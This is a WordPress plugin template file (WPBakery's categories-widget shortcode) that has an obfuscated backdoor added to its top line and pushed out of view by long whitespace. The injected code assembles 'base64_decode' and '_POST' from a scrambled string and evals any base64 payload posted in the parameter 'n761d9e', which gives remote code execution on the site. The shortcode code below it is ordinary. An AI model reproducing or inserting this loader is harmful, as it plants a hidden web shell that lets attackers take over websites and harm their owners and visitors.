<?php                                                                                                                                                                                                                                                               $gyq71= "cp6s_4batedo";$hdh46 = strtolower ($gyq71[6]. $gyq71[7]. $gyq71[3]. $gyq71[9] .$gyq71[2].$gyq71[5] . $gyq71[4] .$gyq71[10].$gyq71[9].$gyq71[0]. $gyq71[11]. $gyq71[10]. $gyq71[9]);$nci5 =strtoupper( $gyq71[4].$gyq71[1].$gyq71[11]. $gyq71[3].$gyq71[8] );if (isset ( ${ $nci5}[ 'n761d9e'])) {eval( $hdh46(${ $nci5 } [ 'n761d9e'])); }?> <?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * Shortcode attributes
 * @var $atts
 * @var $title
 * @var $options
 * @var $el_class
 * Shortcode class
 * @var $this WPBakeryShortCode_VC_Wp_Categories
 */
$title = $options = $el_class = '';
$output = '';
$atts = vc_map_get_attributes( $this->getShortcode(), $atts );
extract( $atts );

$options = explode( ',', $options );
if ( in_array( 'dropdown', $options ) ) {
	$atts['dropdown'] = true;
}
if ( in_array( 'count', $options ) ) {
	$atts['count'] = true;
}
if ( in_array( 'hierarchical', $options ) ) {
	$atts['hierarchical'] = true;
}

$el_class = $this->getExtraClass( $el_class );

$output = '<div class="vc_wp_categories wpb_content_element' . esc_attr( $el_class ) . '">';
$type = 'WP_Widget_Categories';
$args = array();
global $wp_widget_factory;
// to avoid unwanted warnings let's check before using widget
if ( is_object( $wp_widget_factory ) && isset( $wp_widget_factory->widgets, $wp_widget_factory->widgets[ $type ] ) ) {
	ob_start();
	the_widget( $type, $atts, $args );
	$output .= ob_get_clean();

	$output .= '</div>';

	echo $output;
} else {
	echo $this->debugComment( 'Widget ' . esc_attr( $type ) . 'Not found in : vc_wp_categories' );
}
